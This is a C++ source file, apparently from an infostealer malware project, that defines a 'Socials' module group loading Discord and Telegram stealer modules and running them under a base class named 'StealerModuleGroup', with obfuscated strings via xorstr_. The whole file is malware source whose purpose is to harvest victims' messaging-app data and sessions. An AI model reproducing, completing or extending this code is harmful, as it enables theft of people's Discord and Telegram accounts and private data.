//
// Created by .1qxz on 07.06.2024.
//

#include "Socials.h"
#include "impl/Discord.h"
#include "impl/Telegram.h"

Socials::Socials()
{
    this->modules.push_back(new Discord());
    this->modules.push_back(new Telegram());
}

void Socials::execute(fs::path &root) {
    fs::path socials_path = root / xorstr_("Socials");
    StealerModuleGroup::execute(socials_path);
}
